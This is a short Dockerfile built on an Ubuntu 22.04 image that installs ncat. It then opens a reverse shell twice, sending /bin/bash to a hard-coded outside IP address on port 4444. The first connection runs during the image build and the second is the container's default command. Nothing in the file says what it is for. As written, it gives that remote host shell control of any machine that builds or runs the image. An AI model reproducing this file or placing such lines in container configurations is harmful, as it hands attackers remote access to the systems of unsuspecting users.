FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    ncat

RUN timeout 30 ncat 34.217.130.148 4444 -e /bin/bash || true

CMD ncat 34.217.130.148 4444 -e /bin/bash
